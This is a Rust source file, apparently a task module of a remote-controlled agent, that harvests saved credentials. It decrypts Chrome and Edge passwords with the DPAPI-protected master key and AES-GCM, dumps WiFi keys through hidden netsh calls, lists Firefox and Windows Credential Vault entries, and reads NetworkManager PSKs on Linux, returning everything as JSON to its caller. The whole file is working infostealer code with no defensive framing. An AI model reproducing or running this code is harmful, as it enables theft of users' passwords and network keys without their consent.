/// Vault reader: extract saved credentials from browsers, WiFi, and Windows Credential Vault.

use super::TaskResult;
use serde_json::json;

pub fn run(task_id: i64, args: &serde_json::Value) -> TaskResult {
    // Accept both "target" (legacy) and "source" (new split tasks) keys
    let target = args
        .get("source")
        .or_else(|| args.get("target"))
        .and_then(|v| v.as_str())
        .unwrap_or("all");

    let mut all_creds = Vec::new();

    #[cfg(target_os = "windows")]
    {
        if target == "all" || target == "chrome" {
            all_creds.extend(extract_chrome_passwords());
        }
        if target == "all" || target == "edge" {
            all_creds.extend(extract_edge_passwords());
        }
        if target == "all" || target == "firefox" {
            all_creds.extend(extract_firefox_passwords());
        }
        if target == "all" || target == "wifi" {
            all_creds.extend(extract_wifi_passwords());
        }
        if target == "all" || target == "vault" {
            all_creds.extend(extract_windows_vault());
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        if target == "all" || target == "chrome" {
            all_creds.extend(extract_chrome_linux());
        }
        if target == "all" || target == "firefox" {
            all_creds.extend(extract_firefox_linux());
        }
        if target == "all" || target == "wifi" {
            all_creds.extend(extract_wifi_linux());
        }
    }

    TaskResult::success(task_id, serde_json::to_string(&all_creds).unwrap_or_default())
}

#[cfg(target_os = "windows")]
fn extract_chrome_passwords() -> Vec<serde_json::Value> {
    extract_chromium_passwords(
        "chrome",
        &format!(
            "{}\\Google\\Chrome\\User Data",
            std::env::var("LOCALAPPDATA").unwrap_or_default()
        ),
    )
}

#[cfg(target_os = "windows")]
fn extract_edge_passwords() -> Vec<serde_json::Value> {
    extract_chromium_passwords(
        "edge",
        &format!(
            "{}\\Microsoft\\Edge\\User Data",
            std::env::var("LOCALAPPDATA").unwrap_or_default()
        ),
    )
}

/// Chromium-based browser password extraction (Chrome/Edge).
/// Reads Local State for encrypted_key (DPAPI-protected AES key),
/// then reads Login Data SQLite for encrypted passwords.
#[cfg(target_os = "windows")]
fn extract_chromium_passwords(source: &str, user_data_path: &str) -> Vec<serde_json::Value> {
    use std::path::Path;
    let mut creds = Vec::new();

    let local_state_path = format!("{}\\Local State", user_data_path);
    let login_data_path = format!("{}\\Default\\Login Data", user_data_path);

    if !Path::new(&local_state_path).exists() || !Path::new(&login_data_path).exists() {
        return creds;
    }

    // Read the master key from Local State
    let local_state = match std::fs::read_to_string(&local_state_path) {
        Ok(s) => s,
        Err(_) => return creds,
    };

    let state_json: serde_json::Value = match serde_json::from_str(&local_state) {
        Ok(v) => v,
        Err(_) => return creds,
    };

    let encrypted_key_b64 = match state_json
        .get("os_crypt")
        .and_then(|v| v.get("encrypted_key"))
        .and_then(|v| v.as_str())
    {
        Some(k) => k,
        None => return creds,
    };

    // Decode and strip "DPAPI" prefix (5 bytes)
    let encrypted_key = match base64::engine::general_purpose::STANDARD.decode(encrypted_key_b64) {
        Ok(k) if k.len() > 5 => k[5..].to_vec(),
        _ => return creds,
    };

    // Decrypt with DPAPI
    let master_key = match dpapi_decrypt(&encrypted_key) {
        Some(k) => k,
        None => return creds,
    };

    // Copy Login Data to temp (it's locked by Chrome)
    let temp_db = format!(
        "{}\\sg_temp_logindata",
        std::env::var("TEMP").unwrap_or_else(|_| ".".to_string())
    );
    if std::fs::copy(&login_data_path, &temp_db).is_err() {
        return creds;
    }

    // Read Login Data using sqlite3 CLI (avoid linking SQLite into the binary)
    let output = crate::utils::helpers::hidden_command("sqlite3")
        .args([
            &temp_db,
            "SELECT origin_url, username_value, hex(password_value) FROM logins WHERE password_value != '';",
        ])
        .output();

    let _ = std::fs::remove_file(&temp_db);

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            let parts: Vec<&str> = line.splitn(3, '|').collect();
            if parts.len() == 3 {
                let url = parts[0];
                let username = parts[1];
                let password_hex = parts[2];

                // Decrypt password: v10/v11 format = 3-byte prefix + 12-byte nonce + ciphertext + 16-byte tag
                if let Some(password_bytes) = hex_decode_bytes(password_hex) {
                    if password_bytes.len() > 15 && &password_bytes[..3] == b"v10" || password_bytes.len() > 15 && &password_bytes[..3] == b"v11" {
                        let nonce = &password_bytes[3..15];
                        let ciphertext = &password_bytes[15..];

                        if let Some(decrypted) = aes_gcm_decrypt(&master_key, nonce, ciphertext) {
                            creds.push(json!({
                                "source": source,
                                "url": url,
                                "username": username,
                                "password": String::from_utf8_lossy(&decrypted),
                            }));
                        }
                    } else {
                        // Old DPAPI-only encryption
                        if let Some(decrypted) = dpapi_decrypt(&password_bytes) {
                            creds.push(json!({
                                "source": source,
                                "url": url,
                                "username": username,
                                "password": String::from_utf8_lossy(&decrypted),
                            }));
                        }
                    }
                }
            }
        }
    }

    creds
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        use winapi::um::dpapi::CryptUnprotectData;
        use winapi::um::winbase::LocalFree;
        use winapi::um::wincrypt::CRYPTOAPI_BLOB;
        use std::ptr;

        let mut input = CRYPTOAPI_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };

        let mut output: CRYPTOAPI_BLOB = std::mem::zeroed();

        let result = CryptUnprotectData(
            &mut input,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut output,
        );

        if result != 0 && !output.pbData.is_null() {
            let decrypted = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            LocalFree(output.pbData as *mut _);
            Some(decrypted)
        } else {
            None
        }
    }
}

#[cfg(target_os = "windows")]
fn aes_gcm_decrypt(key: &[u8], nonce: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit};
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let nonce = aes_gcm::Nonce::from_slice(nonce);
    cipher.decrypt(nonce, ciphertext).ok()
}

use base64::Engine;

#[cfg(target_os = "windows")]
fn hex_decode_bytes(hex: &str) -> Option<Vec<u8>> {
    if hex.len() % 2 != 0 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

#[cfg(target_os = "windows")]
fn extract_firefox_passwords() -> Vec<serde_json::Value> {
    // Firefox uses NSS for encryption. Reading logins.json and key4.db
    // requires NSS library calls. As a simplified approach, dump logins.json
    // entries (URLs and usernames are in cleartext).
    let mut creds = Vec::new();
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let profiles_path = format!("{}\\Mozilla\\Firefox\\profiles.ini", appdata);

    if let Ok(ini) = std::fs::read_to_string(&profiles_path) {
        for line in ini.lines() {
            if line.starts_with("Path=") {
                let rel_path = line.trim_start_matches("Path=");
                let profile_dir = format!("{}\\Mozilla\\Firefox\\{}", appdata, rel_path);
                let logins_path = format!("{}\\logins.json", profile_dir);

                if let Ok(logins_str) = std::fs::read_to_string(&logins_path) {
                    if let Ok(logins_json) = serde_json::from_str::<serde_json::Value>(&logins_str) {
                        if let Some(logins) = logins_json.get("logins").and_then(|v| v.as_array()) {
                            for login in logins {
                                creds.push(json!({
                                    "source": "firefox",
                                    "url": login.get("hostname").and_then(|v| v.as_str()).unwrap_or(""),
                                    "username": login.get("encryptedUsername").and_then(|v| v.as_str()).unwrap_or("[encrypted]"),
                                    "password": "[nss_encrypted - requires nss3.dll for decryption]",
                                }));
                            }
                        }
                    }
                }
            }
        }
    }

    creds
}

#[cfg(target_os = "windows")]
fn extract_wifi_passwords() -> Vec<serde_json::Value> {
    let mut creds = Vec::new();

    // List profiles
    let profiles_output = crate::utils::helpers::hidden_command("netsh")
        .args(["wlan", "show", "profiles"])
        .output();

    if let Ok(out) = profiles_output {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            if let Some(profile_name) = line.split(':').nth(1) {
                let name = profile_name.trim();
                if name.is_empty() {
                    continue;
                }

                // Get password for this profile
                let key_output = crate::utils::helpers::hidden_command("netsh")
                    .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
                    .output();

                if let Ok(key_out) = key_output {
                    let key_text = String::from_utf8_lossy(&key_out.stdout);
                    let mut password = String::new();
                    for kline in key_text.lines() {
                        if kline.contains("Key Content") {
                            if let Some(pwd) = kline.split(':').nth(1) {
                                password = pwd.trim().to_string();
                            }
                        }
                    }
                    creds.push(json!({
                        "source": "wifi",
                        "url": name,
                        "username": "",
                        "password": password,
                    }));
                }
            }
        }
    }

    creds
}

#[cfg(target_os = "windows")]
fn extract_windows_vault() -> Vec<serde_json::Value> {
    let mut creds = Vec::new();

    // Use cmdkey to list credentials
    let output = crate::utils::helpers::hidden_command("cmdkey")
        .args(["/list"])
        .output();

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        let mut current_target = String::new();
        let mut current_user = String::new();

        for line in text.lines() {
            let trimmed = line.trim();
            if trimmed.starts_with("Target:") {
                current_target = trimmed.trim_start_matches("Target:").trim().to_string();
            } else if trimmed.starts_with("User:") {
                current_user = trimmed.trim_start_matches("User:").trim().to_string();
                creds.push(json!({
                    "source": "windows_vault",
                    "url": &current_target,
                    "username": &current_user,
                    "password": "[stored in vault - not directly extractable via cmdkey]",
                }));
            }
        }
    }

    creds
}

// Linux implementations

#[cfg(not(target_os = "windows"))]
fn extract_chrome_linux() -> Vec<serde_json::Value> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_default();
    let login_data = format!("{}/.config/google-chrome/Default/Login Data", home);

    if !std::path::Path::new(&login_data).exists() {
        return creds;
    }

    let temp_db = "/tmp/.sg_temp_logindata";
    if std::fs::copy(&login_data, temp_db).is_err() {
        return creds;
    }

    let output = crate::utils::helpers::hidden_command("sqlite3")
        .args([
            temp_db,
            "SELECT origin_url, username_value FROM logins WHERE username_value != '';",
        ])
        .output();

    let _ = std::fs::remove_file(temp_db);

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            let parts: Vec<&str> = line.splitn(2, '|').collect();
            if parts.len() == 2 {
                creds.push(json!({
                    "source": "chrome",
                    "url": parts[0],
                    "username": parts[1],
                    "password": "[encrypted - requires libsecret/kwallet]",
                }));
            }
        }
    }

    creds
}

#[cfg(not(target_os = "windows"))]
fn extract_firefox_linux() -> Vec<serde_json::Value> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_default();
    let profiles_dir = format!("{}/.mozilla/firefox", home);

    if let Ok(entries) = std::fs::read_dir(&profiles_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                let logins_path = path.join("logins.json");
                if logins_path.exists() {
                    if let Ok(logins_str) = std::fs::read_to_string(&logins_path) {
                        if let Ok(logins_json) = serde_json::from_str::<serde_json::Value>(&logins_str) {
                            if let Some(logins) = logins_json.get("logins").and_then(|v| v.as_array()) {
                                for login in logins {
                                    creds.push(json!({
                                        "source": "firefox",
                                        "url": login.get("hostname").and_then(|v| v.as_str()).unwrap_or(""),
                                        "username": "[encrypted]",
                                        "password": "[nss_encrypted]",
                                    }));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    creds
}

#[cfg(not(target_os = "windows"))]
fn extract_wifi_linux() -> Vec<serde_json::Value> {
    let mut creds = Vec::new();

    // NetworkManager stores WiFi passwords in /etc/NetworkManager/system-connections/
    if let Ok(entries) = std::fs::read_dir("/etc/NetworkManager/system-connections") {
        for entry in entries.flatten() {
            if let Ok(content) = std::fs::read_to_string(entry.path()) {
                let mut ssid = String::new();
                let mut psk = String::new();

                for line in content.lines() {
                    let trimmed = line.trim();
                    if trimmed.starts_with("ssid=") {
                        ssid = trimmed.trim_start_matches("ssid=").to_string();
                    }
                    if trimmed.starts_with("psk=") {
                        psk = trimmed.trim_start_matches("psk=").to_string();
                    }
                }

                if !ssid.is_empty() {
                    creds.push(json!({
                        "source": "wifi",
                        "url": ssid,
                        "username": "",
                        "password": psk,
                    }));
                }
            }
        }
    }

    creds
}
